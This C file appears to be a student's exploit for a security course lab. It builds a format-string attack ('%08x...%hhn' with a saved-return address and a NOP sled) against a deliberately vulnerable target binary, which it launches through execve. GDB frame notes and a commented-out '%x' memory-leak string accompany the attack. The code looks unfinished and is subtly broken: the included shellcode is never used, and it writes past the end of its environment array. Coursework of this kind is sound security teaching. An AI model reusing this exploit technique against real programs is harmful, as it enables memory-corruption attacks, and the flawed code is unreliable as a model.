#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

const char * payload = "%08x%08x%08x%08x%08x%hhn"; 

int main(void)
{
  char *args[3];
  char *env[5];

  args[0] = TARGET;

  /* INFO FROM GDB:
   *    
   *        % info frame (of foo)
   *             
   *              Arglist at 0x2021fe90, args: 
   *              arg=0x7fffffffedb5 "" Locals at 0x2021fe90, Previous frame's sp is 0x2021fea0
   *              Saved registers:
   *              rbp at 0x2021fe90, rip at 0x2021fe98
   */

  char exploit[256] = {0};
  strcat(exploit, "\x98\xfe\x21\x20");
  exploit[4] = '\x00';
  exploit[5] = '\x00';
  exploit[6] = '\x00';
  exploit[7] = '\x00';
  memset(exploit+8, '\x90', 248);

  //strcat(&exploit[60], "%x%x%x%x%x%x");
  memcpy(exploit+60, payload, strlen(payload));
  //strcat(&exploit[72], "\x98\xfe\x21\x20");
  
  env[0] = &exploit[4];
  env[1] = &exploit[5];
  env[2] = &exploit[6];
  env[3] = &exploit[7];
  env[4] = &exploit[8];
  env[5] = NULL;

  //strcat(exploit, "\x98\xfe\x21\x20");
  //  exploit[0] = '\x98';
  
  

  args[1] = exploit;
  // args[1] = "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x";
  args[2] = NULL;
  //  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
